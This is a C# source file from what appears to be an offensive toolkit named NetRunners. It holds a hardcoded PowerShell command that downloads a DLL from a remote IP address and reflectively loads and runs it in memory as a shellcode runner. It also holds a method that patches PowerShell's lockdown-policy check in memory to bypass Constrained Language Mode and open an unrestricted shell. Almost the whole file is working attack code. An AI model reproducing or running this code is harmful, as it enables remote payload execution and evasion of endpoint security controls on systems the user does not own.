using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using static NetRunners.Delegates.Delegate;

namespace NetRunners.Clm
{
    public static class Command
    {
        // command to execute (by default: reflectively load DLL shellcode runner) (second one creates instance of testclass, the first one executes a static method.)
        //public static string cmd = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).GetType('NetRunnersDll.TestClass').GetMethod('TestClass').Invoke(0, $null)";
        public static string cmd = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).CreateInstance('NetRunnersDll.TestClass')";
        
        public static void Execute(string cmd)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            // run cmd
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }

        // interactive CLM bypass source: https://github.com/calebstewart/bypass-clm/blob/master/bypass-clm/Program.cs
        public static void BypassClm()
        {
            // Find a reference to the automation assembly
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);
            
            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop"
            });
        }
    }
}
